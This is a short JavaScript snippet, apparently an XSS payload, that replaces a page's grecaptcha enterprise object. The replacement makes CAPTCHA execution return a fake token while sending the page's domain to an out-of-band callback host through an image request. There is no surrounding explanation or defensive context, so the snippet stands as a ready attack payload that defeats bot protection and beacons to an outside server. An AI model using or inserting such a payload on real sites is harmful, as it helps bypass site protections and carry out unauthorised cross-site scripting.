// Hijack grecaptcha object to fake token generation
window.grecaptcha = {
  enterprise: {
    ready: (cb) => cb(),
    execute: (key, opt) => {
      new Image().src = "https://<your-oast>.oast.fun/xss?d=" + document.domain;
      return Promise.resolve("fake-token");
    }
  }
};
